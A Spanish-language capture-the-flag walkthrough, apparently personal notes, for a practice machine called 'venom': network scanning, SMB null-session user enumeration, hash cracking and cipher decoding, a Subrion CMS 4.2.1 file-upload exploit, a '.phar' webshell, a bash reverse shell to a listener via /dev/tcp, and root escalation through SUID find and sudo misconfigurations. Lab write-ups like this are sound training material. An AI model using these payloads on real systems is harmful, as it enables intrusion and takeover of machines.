Buscamos el obj en la red
```
nmap -sn 192.168.1.1/24 
```

Averiguamos que SO tiene 
```
whichSystem.py 192.168.1.80
```
Hacemos un scaneo de los puertos
```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.80 -oG ./nmap/allPorts
```

Para saber que tecnologias usa el servidor web utilizamos
```
whatweb http://192.168.1.80

http://192.168.1.80 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[192.168.1.80], Title[Apache2 Ubuntu Default Page: It works]
```

En la pagina del servdor detectamos algo extranno asi que revisamos su codigo y encontramos un has
```
5f2a66f947fa5690c26506f66bde5c23

Identificamos el tipo de hash con hash-identifier

Lo pasamos por el sitio  https://crackstation.net/ y nos da: 

hostinger
```

Utilizamos la herramienta hash-identifier para identificar que tipo de hash es.

Tenemos el puerto smb (445) abierto asi que intentaremos hacer un null session para poder enumerara usuarios utilizaremos la herramiente rpcclient que nos da una coneccion y a partir de aqui podremos enumerar

```
rpcclient -U "" 192.168.1.80 -N

Enumeramos los sui
rpcclient -U "" 192.168.1.80 -N -c "lsaenumsid"

Buscamos  nombres a partir de los sid
rpcclient -U "" 192.168.1.80 -N -c "lookupsids S-1-5-32-549"

Buscamos sid a partir de los nombres
rpcclient -U "" 192.168.1.80 -N -c "lookupnames root"

root S-1-22-1-0 

Probaremos varios Sui para obtener el nombre pero de los usuarios cambiando el ultimo numero

rpcclient -U "" 192.168.1.80 -N -c "lookupsids S-1-22-1-1"
S-1-22-1-1 Unix User\daemon (1)

Hacemos un for para poder enumerar varios usuarios par ver que obtenemos

	for i in $(seq 1 30);do  rpcclient -U "" 192.168.1.80 -N -c "lookupsids S-1-22-1-$i";done
	
	
Podemos hacerlo con xargs para que sea mas rapido utilizando varios hilos

seq 1 1000 | xargs -P 50 -I {} rpcclient -U "" 192.168.111.42 -N -c "Lookupsids S-1-5-32-{}|"	

Filtramos para que nos de los nombres y limpiamos los ruidos
seq 1 1500 | xargs -P 50 -I {} rpcclient -U "" 192.168.1.80 -N -c "Lookupsids S-1-22-1-{}" | grep -v unknow | grep -oP 'User\\[a-z].*\s'


Tambien podemos utilizar la herramienta enum4linux para que nos haga la enumeracion 

enum4linux -a 192.168.1.80

```

Encontramos el usuario hostinger , con este nos conectamos por ftp y encontrmos un archivo hint con varias pistas

```
Encontramos unos codigos en base64 y unas instrucciones para descifrar un codigo

Decifrmaos en mas de una ocacion uno de los codigos econtrados 
echo "WXpOU2FHSnRVbWhqYlZGblpHMXNibHBYTld4amJWVm5XVEpzZDJGSFZuaz0=" | base64 -d | base64 -d | base64 -d

standard vigenere cipher 

Y e otro nos da un sitio para decifrar el cifrado
echo "aHR0cHM6Ly9jcnlwdGlpLmNvbS9waXBlcy92aWdlbmVyZS1jaXBoZXI=" | base64 -d                            
https://cryptii.com/pipes/vigenere-cipher

Aunque podemos utilizar este tambien
https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode('hostinger')&input=TDdmOWw4QEojcCVVZStRMTIzNAoKRTdyOXQ4QFEjaCVIeStNMTIzNA 
```

Nos agregamos en el host la ruta indicada en el hint 
```
192.168.1.80 venom.box
```

Entramos en el navegador en la direccion
```
http://venom.box
```

Decifrando el hash en el sitio utilizamos la pass del archivo hint y como ket la pass decifrada del hash
https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode('hostinger')&input=TDdmOWw4QEojcCVVZStRMTIzNAoKRTdyOXQ4QFEjaCVIeStNMTIzNA

![[Pasted image 20251012215059.png]]

Entramos al sitio web http://venom.box/panel/  con el usuario dora y la pass descifrada E7r9t8@Q#h%Hy+M1234

De aqui obtenemos la version del sistema que esta montado

Subrion CMS  v 4.2.1

Hacemos una busqueda con searchsploit de vulnerabilidades , envonramos un scrip que permite la subida de archivos y lo explotamos

```
searchsploit subrion 4.2.1 
Subrion CMS 4.2.1 - Arbitrary File Upload                                                                      | php/webapps/49876.py

Lo descargamos y le modificamos el nombre luego lo abrimos y entendemos como funciona y lo ejecutamos

searchsploit -m 49876

mv 49876.py subrion_exploit.py   

Lo explotamos con el usuario y el pass que obtuvimos en instancias anteriores

python3 subrion_exploit.py -u 'http://venom.box/panel/' --user dora --passw 'E7r9t8@Q#h%Hy+M1234'

Esto nos da una conexion a nuestro equipo
```

Tambien podemos acceder mediante el avegador un ves se subio este archivo y pasarle al parametro cmd los comandos que querramos
```
http://venom.box/uploads/gbvzljabtbtcfni.phar?cmd=whoami
```

Para obtener errores podemos modificar el parametro para detectar estos errores
```
http://venom.box/uploads/gbvzljabtbtcfni.phar?cmd=whoami 2>&1

http://venom.box/uploads/gbvzljabtbtcfni.phar?cmd=whoami 2>%261

```

Realizaremos una coneccion a un puerto de escucha con netcat
```
sudo nc -lvnp 443

Nos conectamos desde el navegador utilizando el payload que subimos

http://venom.box/uploads/wczjqsabccebbvh.phar?cmd=bash%20-c%20%22bash%20-i%20%3E&%20/dev/tcp/192.168.1.108/443%200%3E&1%22

http://venom.box/uploads/wczjqsabccebbvh.phar?cmd=bash%20-c%20%22bash%20-i%20%3E&%20/dev/tcp/192.168.1.108/1234%200%3E&1%22
```

Despues Hacemos un tratamiento de la tty para trabajar mas comodos
[[Migrar a una TTY]]

Si no queremos tener que acer el tratamiento de la tty podemos escucha en vez de con  netcat, nos ponemos a escucha con pwncat que es una utilidad mejorada

Una ves dentro seguiremos con el proceso de recopilacion de informacion 
verificamos que usuario somos
```
whoami

cd /home
/home# ls -sail
total 16
1046529 4 drwxr-xr-x  4 root      root      4096 May 21  2021 .
      2 4 drwxr-xr-x 24 root      root      4096 May 20  2021 ..
1071998 4 drwxr-xr-x 16 hostinger hostinger 4096 May 22  2021 hostinger
1070340 4 drwxr-x--- 17 nathan    nathan    4096 May 22  2021 nathan
```

Buscamos informacion donde encontramos un fichero con lo que parce una pass
```
1191156 4 -rwxr-xr-x  1 www-data www-data   81 May 21  2021 .htaccess
hostinger@venom:/var/www/html/subrion/backup$ cat .htaccess 
allow from all
You_will_be_happy_now :)

FzN+f2-rRaBgvALzj*Rk#_JJYfg8XfKhxqB82x_a

```

la probamos para el usuario nathan y otenemos acceso y buscamosficheros con permisos uid
```
find / -perm -4000 -ls -user root 2>/dev/null 
```

Encontramos que find tiene permisos uid y ademas el propietario es root 
asi que vamos al sitio https://gtfobins.github.io/#find

y obtenemos que se puede escalar a un shell con find


```
find . -exec /bin/sh \; -quit
```

Tambien a partir del usuario nathan se puede realizar la esalada devido a sus permisos 

```
nathan@venom:~$ sudo -l
Matching Defaults entries for nathan on venom:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nathan may run the following commands on venom:
    (root) ALL, !/bin/su
    (root) ALL, !/bin/su
nathan@venom:~$ 

nathan@venom:~$ sudo -u root bash
root@venom:~#

```

Otros ejemplos de malas configuraciones de sudoers

```
usuario ALL=(ALL,!root) /usr/bin/vim
```
El atacante puede usar `sudo -u#-1 vim` para acceder como root. Se aprovecha de la interpretación incorrecta del ID de usuario negativo (`-1`) como equivalente al UID 0 (root).

